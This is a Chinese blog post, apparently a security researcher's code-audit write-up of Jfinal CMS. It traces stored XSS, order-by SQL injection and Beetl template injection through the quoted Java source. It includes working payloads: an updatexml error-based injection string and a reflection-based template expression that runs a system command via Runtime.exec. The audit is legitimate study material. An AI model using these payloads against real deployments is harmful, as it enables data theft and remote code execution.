@@ -1,0 +1,600 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Jfinal CMS代码审计实战 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Jfinal CMS代码审计实战 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="存储型XSS
+update代码：
+public void save() {
+    JSONObject json = new JSONObject();
+    json.put(&quot;status&quot;, 2);// 失败
+..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Jfinal CMS代码审计实战
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-07-31
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="存储型xss">存储型XSS</h1>
+<p>update代码：</p>
+<pre><code class="language-java">public void save() {
+    JSONObject json = new JSONObject();
+    json.put(&quot;status&quot;, 2);// 失败
+
+    SysUser user = (SysUser) getSessionUser();
+    int userid = user.getInt(&quot;userid&quot;);
+    SysUser model = getModel(SysUser.class);
+
+    if (userid != model.getInt(&quot;userid&quot;)) {
+        json.put(&quot;msg&quot;, &quot;提交数据错误！&quot;);
+        renderJson(json.toJSONString());
+        return;
+    }
+
+    // 第三方用户不需要密码
+    if (user.getInt(&quot;usertype&quot;) != 4) {
+        String oldPassword = getPara(&quot;old_password&quot;);
+        String newPassword = getPara(&quot;new_password&quot;);
+        String newPassword2 = getPara(&quot;new_password2&quot;);
+        if (!user.getStr(&quot;password&quot;).equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) {
+            json.put(&quot;msg&quot;, &quot;密码错误！&quot;);
+            renderJson(json.toJSONString());
+            return;
+        }
+        if (StrUtils.isNotEmpty(newPassword) &amp;&amp; !newPassword.equals(newPassword2)) {
+            json.put(&quot;msg&quot;, &quot;两次新密码不一致！&quot;);
+            renderJson(json.toJSONString());
+            return;
+        } else if (StrUtils.isNotEmpty(newPassword)) { // 输入密码并且一直
+            model.set(&quot;password&quot;, JFlyFoxUtils.passwordEncrypt(newPassword));
+        }
+    }
+
+    if (StrUtils.isNotEmpty(model.getStr(&quot;email&quot;)) &amp;&amp; model.getStr(&quot;email&quot;).indexOf(&quot;@&quot;) &lt; 0) {
+        json.put(&quot;msg&quot;, &quot;email格式错误！&quot;);
+        renderJson(json.toJSONString());
+        return;
+    }
+
+    model.update();
+    UserCache.init(); // 设置缓存
+    SysUser newUser = SysUser.dao.findById(userid);
+    setSessionUser(newUser); // 设置session
+    json.put(&quot;status&quot;, 1);// 成功
+
+    renderJson(json.toJSONString());
+}
+
+...
+    
+public boolean update() {
+    filter(FILTER_BY_UPDATE);
+
+    if (_getModifyFlag().isEmpty()) {
+        return false;
+    }
+
+    Table table = _getTable();
+    String[] pKeys = table.getPrimaryKey();
+    for (String pKey : pKeys) {
+        Object id = attrs.get(pKey);
+        if (id == null)
+            throw new ActiveRecordException(&quot;You can't update model without Primary Key, &quot; + pKey + &quot; can not be null.&quot;);
+    }
+
+    Config config = _getConfig();
+    StringBuilder sql = new StringBuilder();
+    List&lt;Object&gt; paras = new ArrayList&lt;Object&gt;();
+    config.dialect.forModelUpdate(table, attrs, _getModifyFlag(), sql, paras);
+
+    if (paras.size() &lt;= 1) {	// Needn't update
+        return false;
+    }
+
+    // --------
+    Connection conn = null;
+    try {
+        conn = config.getConnection();
+        int result = Db.update(config, conn, sql.toString(), paras.toArray());
+        if (result &gt;= 1) {
+            _getModifyFlag().clear();
+            return true;
+        }
+        return false;
+    } catch (Exception e) {
+        throw new ActiveRecordException(e);
+    } finally {
+        config.close(conn);
+    }
+}
+
+public void forModelUpdate(Table table, Map&lt;String, Object&gt; attrs, Set&lt;String&gt; modifyFlag, StringBuilder sql, List&lt;Object&gt; paras) {
+    sql.append(&quot;update `&quot;).append(table.getName()).append(&quot;` set &quot;);
+    String[] pKeys = table.getPrimaryKey();
+    for (Entry&lt;String, Object&gt; e : attrs.entrySet()) {
+        String colName = e.getKey();
+        if (modifyFlag.contains(colName) &amp;&amp; !isPrimaryKey(colName, pKeys) &amp;&amp; table.hasColumnLabel(colName)) {
+            if (paras.size() &gt; 0) {
+                sql.append(&quot;, &quot;);
+            }
+            sql.append('`').append(colName).append(&quot;` = ? &quot;);
+            paras.add(e.getValue());
+        }
+    }
+    sql.append(&quot; where &quot;);
+    for (int i=0; i&lt;pKeys.length; i++) {
+        if (i &gt; 0) {
+            sql.append(&quot; and &quot;);
+        }
+        sql.append('`').append(pKeys[i]).append(&quot;` = ?&quot;);
+        paras.add(attrs.get(pKeys[i]));
+    }
+}
+
+...
+    
+protected int update(Config config, Connection conn, String sql, Object... paras) throws SQLException {
+    PreparedStatement pst = conn.prepareStatement(sql);
+    config.dialect.fillStatement(pst, paras);
+    int result = pst.executeUpdate();
+    DbKit.close(pst);
+    return result;
+}
+</code></pre>
+<ol>
+<li>先是调用getSessionUser()方法从HttpSession中获取用户的userid</li>
+<li>调用getModel()方法，获取了request请求中的参数，并且判断传入的userid是否和session中的userid一致</li>
+<li>调用Model#update()方法对个人资料进行更新
+<ol>
+<li>获取主键的值，没有则抛出异常</li>
+<li>调用<code>MysqlDialect#forModelUpdate()</code>方法自动生成sql语句，并且对sql语句进行拼接，可以明显看到使用了'?'作为占位符</li>
+<li>调用<code>Db.update()</code>方法，使用预编译执行sql语句</li>
+</ol>
+</li>
+</ol>
+<p>获取reqeust参数的代码：</p>
+<pre><code class="language-java">public static final &lt;T&gt; T injectModel(Class&lt;T&gt; modelClass, String modelName, HttpServletRequest request, boolean skipConvertError) {
+    Object temp = createInstance(modelClass);
+    if (temp instanceof Model == false) {
+        throw new IllegalArgumentException(&quot;getModel only support class of Model, using getBean for other class.&quot;);
+    }
+
+    Model&lt;?&gt; model = (Model&lt;?&gt;)temp;
+    Table table = TableMapping.me().getTable(model.getClass());
+    if (table == null) {
+        throw new ActiveRecordException(&quot;The Table mapping of model: &quot; + modelClass.getName() + 
+                                        &quot; not exists or the ActiveRecordPlugin not start.&quot;);
+    }
+
+    String modelNameAndDot = StrKit.notBlank(modelName) ? modelName + &quot;.&quot; : null;
+    Map&lt;String, String[]&gt; parasMap = request.getParameterMap();
+    TypeConverter converter = TypeConverter.me();
+    // 对 paraMap进行遍历而不是对table.getColumnTypeMapEntrySet()进行遍历，以便支持 CaseInsensitiveContainerFactory
+    // 以及支持界面的 attrName有误时可以感知并抛出异常避免出错
+    for (Entry&lt;String, String[]&gt; entry : parasMap.entrySet()) {
+        String paraName = entry.getKey();
+        String attrName;
+        if (modelNameAndDot != null) {
+            if (paraName.startsWith(modelNameAndDot)) {
+                attrName = paraName.substring(modelNameAndDot.length());
+            } else {
+                continue ;
+            }
+        } else {
+            attrName = paraName;
+        }
+
+        Class&lt;?&gt; colType = table.getColumnType(attrName);
+        if (colType == null) {
+            if (skipConvertError) {
+                continue ;
+            } else {
+                throw new ActiveRecordException(&quot;The model attribute &quot; + attrName + &quot; is not exists.&quot;);
+            }
+        }
+
+        try {
+            String[] paraValueArray = entry.getValue();
+            String paraValue = (paraValueArray != null &amp;&amp; paraValueArray.length &gt; 0) ? paraValueArray[0] : null;
+
+            Object value = paraValue != null ? converter.convert(colType, paraValue) : null;
+            model.set(attrName, value);
+        } catch (Exception e) {
+            if (skipConvertError == false) {
+                throw new RuntimeException(&quot;Can not convert parameter: &quot; + paraName, e);
+            }
+        }
+    }
+
+    return (T)model;
+}
+</code></pre>
+<ol>
+<li>调用<code>request.getParameterMap()</code>方法，然后进行遍历</li>
+<li>从数据库中获取了这个key的类型，然后接下来在赋值的时候进行相应的类型转换</li>
+</ol>
+<p>request和response包：<br>
+<img src="https://1jzz.github.io/post-images/1659228909459.png" alt="" loading="lazy"><br>
+获取attribute代码：</p>
+<pre><code class="language-java">public void profile() {
+    SysUser user = (SysUser) getSessionUser();
+    if (user == null) {
+        redirect(CommonController.firstPage);
+        return;
+    }
+
+    setAttr(&quot;model&quot;, user);
+
+    // TODO 用户信息展示
+    setAttr(&quot;user&quot;, user);
+
+    // 活动目录
+    setAttr(&quot;folders_selected&quot;, &quot;person&quot;);
+
+    renderAuto(path + &quot;show_person.html&quot;);
+}
+...
+	public SessionUser getSessionUser() {
+		SysUser sysUser = getSessionAttr(Attr.SESSION_NAME);
+		try {
+			// 如果session没有，cookie有~那么就设置到Session
+			if (sysUser == null) {
+				String cookieContent = getCookie(Attr.SESSION_NAME);
+				if (cookieContent != null) {
+					String key = JFlyFoxUtils.cookieDecrypt(cookieContent);
+					if (StrUtils.isNotEmpty(key) &amp;&amp; key.split(&quot;,&quot;).length == 2) {
+						int userid = NumberUtils.parseInt(key.split(&quot;,&quot;)[0]);
+						String password = key.split(&quot;,&quot;)[1];
+						sysUser = SysUser.dao.findFirstByWhere(&quot; where userid = ? and password = ? &quot;, userid, password);
+						if (sysUser != null)
+							setSessionUser(sysUser);
+					}
+				}
+			}
+		} catch (Exception e) {
+			// 异常cookie重新登陆
+			removeSessionAttr(Attr.SESSION_NAME);
+			removeCookie(Attr.SESSION_NAME);
+
+			log.error(&quot;cooke user异常:&quot;, e);
+			return null;
+		}
+		return sysUser;
+	}
+...
+public &lt;T&gt; T getSessionAttr(String key) {
+	HttpSession session = request.getSession(false);
+	return session != null ? (T)session.getAttribute(key) : null;
+}
+</code></pre>
+<ol>
+<li><code>BaseProjectController#getSessionUser()</code>：调用Controller#getSessionAttr()方法来</li>
+<li><code>Controller#getSessionAttr()</code>：调用HttpSession#getAttribute()方法获取session中的session_user属性</li>
+<li><code>BaseProjectController#renderAuto()</code>：跳转到相对应路径的模板中，这里的模板路径为/template/bbs/person/show_person.html</li>
+</ol>
+<p><img src="https://1jzz.github.io/post-images/1659228918876.png" alt="" loading="lazy"><br>
+可以看到在数据库中的payload是正常的，并没有进行转义和过滤。<br>
+<img src="https://1jzz.github.io/post-images/1659228926543.png" alt="" loading="lazy"><br>
+我们可以在模板中查找是否有将payload直接打印出来。<br>
+在show_person.html中可以看并没有将其值直接打印出来，但是这里可以通过闭合双引号来执行payload。<br>
+<img src="https://1jzz.github.io/post-images/1659228934398.png" alt="" loading="lazy"><br>
+但是在下面包含了一些其他html文件，可以进行查看。<br>
+可以看到这里直接输出了<code>${user.realname!''}</code>，就可以直接使用<code>&lt;script&gt;</code>执行xss。<br>
+<img src="https://1jzz.github.io/post-images/1659228941832.png" alt="" loading="lazy"><br>
+直接执行：<br>
+<img src="https://1jzz.github.io/post-images/1659228947792.png" alt="" loading="lazy"><br>
+闭合(因为存在两处闭合点，所以一共会弹窗三次)：<br>
+<img src="https://1jzz.github.io/post-images/1659228953635.png" alt="" loading="lazy"></p>
+<h1 id="后台order-by-sql注入">后台order by sql注入</h1>
+<p>controller代码：</p>
+<pre><code class="language-java">public void list() {
+    SysDepartment model = getModelByAttr(SysDepartment.class);
+
+    SQLUtils sql = new SQLUtils(&quot; from sys_department t &quot;
+                                + &quot; left join sys_department p on t.parent_id = p.id  where 1=1 &quot;);
+    if (model.getAttrValues().length != 0) {
+        sql.setAlias(&quot;t&quot;);
+        // 查询条件
+        sql.whereLike(&quot;name&quot;, model.getStr(&quot;name&quot;));
+    }
+
+    // 排序
+    String orderBy = getBaseForm().getOrderBy();
+    if (StrUtils.isEmpty(orderBy)) {
+        sql.append(&quot; order by t.sort,t.id desc &quot;);
+    } else {
+        sql.append(&quot; order by &quot;).append(orderBy);
+    }
+
+    Page&lt;SysDepartment&gt; page = SysDepartment.dao.paginate(getPaginator(), &quot;select t.*,p.name as parentName &quot;, //
+                                                          sql.toString().toString());
+
+    // 下拉框
+    setAttr(&quot;page&quot;, page);
+    setAttr(&quot;attr&quot;, model);
+
+    List&lt;SysDepartment&gt; departments = SysDepartment.dao.find(&quot;select * from sys_department order by sort,id &quot;);
+    setAttr(&quot;departments&quot;, departments);
+
+    render(path + &quot;list.html&quot;);
+}
+</code></pre>
+<p>可以看到sql语句中其他地方都是预定义好的，而只有当调用了<code>BaseForm#getOrderBy()</code>方法时获得到的oreder by不为空则拼接到sql语句中，如果为空则自动按照t.id进行排序。<br>
+看一下<code>BaseForm#getOrderBy()</code>方法：</p>
+<pre><code class="language-java">public String getOrderBy() {
+    if (StrUtils.isEmpty(getOrderColumn())) {
+        return &quot;&quot;;
+    }
+    return &quot; &quot; + getOrderColumn() + &quot; &quot; + getOrderAsc() + &quot; &quot;;
+}
+</code></pre>
+<p>获取了orderColumn和OrderAsc这两个参数直接进行拼接，也没有过滤函数进行过滤。我们可以通过报错注入进行利用。<br>
+传入参数：<code>form.orderColumn=name+AND+(updatexml(1,concat(0x7e,(database()),0x7e),1))%23&amp;form.orderAsc=desc</code><br>
+拼接后的sql语句：<code>select t.*,p.name as parentName   from sys_department t  left join sys_department p on t.parent_id = p.id  where 1=1  order by  name AND (updatexml(1,concat(0x7e,(database()),0x7e),1))# desc </code><br>
+<img src="https://1jzz.github.io/post-images/1659228965009.png" alt="" loading="lazy"></p>
+<h1 id="ssti模板注入">SSTI模板注入</h1>
+<p>这个cms采用了模板引擎beetl，然后后台又能够修改模板，所以就可能存在模板注入，执行恶意代码。<br>
+稍微看一下模板引擎beetl的一些基本使用方法来构造恶意代码。<br>
+beetl模板语言类似于js语言和习俗，只需将Beetl语言放入定界符号里即可，默认的定界符为<code>&lt;% %&gt;</code>，默认的占位符为<code>${}</code>。(定界符中不能有占位符)<br>
+简单的例子：</p>
+<pre><code class="language-java">&lt;%
+var a = 2;
+var b = 3;
+var result = a+b;
+%&gt;
+hello 2+3=${result}
+</code></pre>
+<p>其中'@'符号用来表明后面表达式调用的是java风格，可以调用对象的方法、属性。<br>
+<img src="https://1jzz.github.io/post-images/1659229009025.png" alt="" loading="lazy"><br>
+因为不允许直接调用java.lang.Runtime和java.lang.Process这两个类，所以我们可以用反射来实例化并且执行命令。<br>
+<img src="https://1jzz.github.io/post-images/1659228976556.png" alt="" loading="lazy"><br>
+request请求包中可以看到其mode为savefile，并且还将路径(path传入进来)。<br>
+<img src="https://1jzz.github.io/post-images/1659229019143.png" alt="" loading="lazy"><br>
+从request中获取content，也就是我们修改完之后的内容，在set完之后再调用saveFile()方法进行文件的保存。<br>
+<img src="https://1jzz.github.io/post-images/1659229062318.png" alt="" loading="lazy"><br>
+代码：<br>
+可以看到，从request中获取到的content，也就是value，在这里直接put到get属性中，没有进行任何的检查和过滤。<br>
+在写入的过程中，也就只有将<code>&amp;lt;/textarea</code>替换成<code>&lt;/textarea</code>的操作，接下来就是获取content的bytes，然后以utf-8的编码方式写入文件中。</p>
+<pre><code class="language-java">public boolean setGetContent(String var, String value) {
+    boolean retval = false;
+    if (value == null || value == &quot;&quot;) {
+        this.error(sprintf(lang(&quot;INVALID_VAR&quot;), var));
+    } else {
+        this.get.put(var, value);
+        retval = true;
+    }
+    return retval;
+}
+
+...
+    
+public JSONObject saveFile() {
+    JSONObject array = new JSONObject();
+
+    try {
+        String content = this.get.get(&quot;content&quot;);
+        content = FileManagerUtils.decodeContent(content);
+
+        // before bakup
+        bakupFile(new File(getRealFilePath()));
+
+        FileManagerUtils.writeString(getRealFilePath(), content);
+        array.put(&quot;Path&quot;, this.get.get(&quot;path&quot;));
+        array.put(&quot;Error&quot;, &quot;&quot;);
+        array.put(&quot;Code&quot;, 0);
+    } catch (JSONException e) {
+        logger.error(&quot;JSONObject error&quot;, e);
+        this.error(&quot;JSONObject error&quot;);
+    } catch (IOException e) {
+        logger.error(&quot;IOException error&quot;, e);
+        this.error(&quot;IOException error&quot;);
+    }
+    return array;
+}
+
+...
+    
+public static String decodeContent(String content) {
+    content = content.replaceAll(&quot;&amp;lt;/textarea&quot;, &quot;&lt;/textarea&quot;);
+    return content;
+}
+...
+    
+    public static void writeString(String path, String content) throws IOException {
+    FileUtils.write(path, content == null ? new byte[0] : content.getBytes(ENCODE));
+}
+
+...
+    
+public static void write(String path, byte[] data) throws IOException {
+    File file = new File(path);
+    // 不存在，创建
+    if (!file.exists()) {
+        file.createNewFile();
+    }
+
+    FileOutputStream fos = new FileOutputStream(file);
+    fos.write(data);
+    fos.flush();
+    fos.close();
+}
+</code></pre>
+<p>那么我们就可以使用它来执行恶意代码，例如我们修改个人资料展示页面的模板(show_person.html)来执行恶意代码：<br>
+<img src="https://1jzz.github.io/post-images/1659229070838.png" alt="" loading="lazy"><br>
+payload：<br>
+<code>${@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null),&quot;calc&quot;)}</code></p>
+<ol>
+<li>先是拿到exec方法的Method对象，并且使用invoke执行</li>
+<li>invoke方法中第一个参数传入一个Runtiem对象(反射)</li>
+<li>第二参数传入需要执行的命令(calc)</li>
+</ol>
+<h1 id="参考">参考</h1>
+<p><a href="https://xz.aliyun.com/t/8695#toc-6">https://xz.aliyun.com/t/8695#toc-6</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss">存储型XSS</a></li>
+<li><a href="#%E5%90%8E%E5%8F%B0order-by-sql%E6%B3%A8%E5%85%A5">后台order by sql注入</a></li>
+<li><a href="#ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5">SSTI模板注入</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/2FwsGV04_/">
+              <h3 class="post-title">
+                java反序列化——CB、Spring、Groovy、Hibernates链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
